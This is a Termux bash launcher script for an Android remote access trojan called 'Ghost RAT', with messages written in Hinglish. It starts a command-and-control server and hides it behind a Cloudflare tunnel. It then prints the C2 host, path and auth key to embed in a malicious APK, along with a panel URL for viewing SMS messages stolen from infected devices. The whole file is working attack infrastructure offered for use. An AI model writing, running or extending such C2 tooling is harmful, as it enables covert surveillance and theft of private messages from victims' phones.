#!/data/data/com.termux/files/usr/bin/bash
# Ghost RAT - Start - Developed Adibhai

cd "$(dirname "$0")"

if [ ! -f config.json ]; then
    echo "[!] config.json nahi mila. Pehle 'bash setup.sh' chalao."
    exit 1
fi

USERNAME=$(python -c "import json;print(json.load(open('config.json'))['username'])")
PORT=$(python -c "import json;print(json.load(open('config.json'))['port'])")
AUTH_KEY=$(python -c "import json;print(json.load(open('config.json'))['auth_key'])")

termux-wake-lock 2>/dev/null

echo ""
echo "============================================================"
echo "  GHOST RAT — $USERNAME"
echo "============================================================"
echo ""

pkill -f "termux-server/server.py" 2>/dev/null
pkill -f "cloudflared tunnel" 2>/dev/null
sleep 1

echo "[*] Server start ho raha hai (port $PORT)..."
cd termux-server
nohup python server.py > ../server.log 2>&1 &
SERVER_PID=$!
cd ..

sleep 2

if ! kill -0 $SERVER_PID 2>/dev/null; then
    echo "[!] Server start nahi hua. server.log:"
    tail -20 server.log
    exit 1
fi

echo "[✓] Server chalu — PID $SERVER_PID"

echo "[*] Cloudflare tunnel start ho raha hai..."
nohup cloudflared tunnel --url http://localhost:$PORT > tunnel.log 2>&1 &
TUNNEL_PID=$!

echo "[*] URL wait kar raha hoon..."
URL=""
for i in $(seq 1 30); do
    URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' tunnel.log | head -1)
    if [ -n "$URL" ]; then break; fi
    sleep 1
done

if [ -z "$URL" ]; then
    echo "[!] Tunnel URL nahi mila. tunnel.log:"
    tail -20 tunnel.log
    exit 1
fi

HOST=$(echo $URL | sed 's|https://||')

echo ""
echo "============================================================"
echo "  SERVER READY"
echo "============================================================"
echo ""
echo "  APK ke assets/config.txt me ye daalo:"
echo ""
echo "    C2_HOST=$HOST"
echo "    C2_PATH=/ghost"
echo "    AUTH_KEY=$AUTH_KEY"
echo ""
echo "============================================================"
echo "  Panel:      $URL"
echo "  /SMS view:  $URL/SMS?did=<device_id>"
echo "============================================================"
echo ""
echo "  Server log:  tail -f server.log"
echo "  Tunnel log:  tail -f tunnel.log"
echo "  Band karo:   bash stop.sh"
echo ""

wait $SERVER_PID
